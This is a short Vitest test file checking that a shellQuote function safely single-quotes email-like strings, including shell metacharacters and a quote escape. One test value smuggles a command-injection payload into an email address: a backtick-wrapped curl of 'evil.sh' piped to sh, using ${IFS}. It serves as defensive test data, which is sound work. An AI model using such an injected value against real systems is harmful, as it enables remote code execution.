import { describe, expect, it } from 'vitest'
import { shellQuote } from './shell'

describe('shellQuote', () => {
  it.each([
    ['bob@example.com', "'bob@example.com'"],
    ['`curl${IFS}evil.sh|sh`@x.com', "'`curl${IFS}evil.sh|sh`@x.com'"],
    ["a'b@x.com", "'a'\\''b@x.com'"],
    ['$HOME@x.com', "'$HOME@x.com'"],
    ['a&b;c@x.com', "'a&b;c@x.com'"],
    ['', "''"],
  ])('quotes %s as %s', (value, quoted) => {
    expect(shellQuote(value)).toBe(quoted)
  })
})
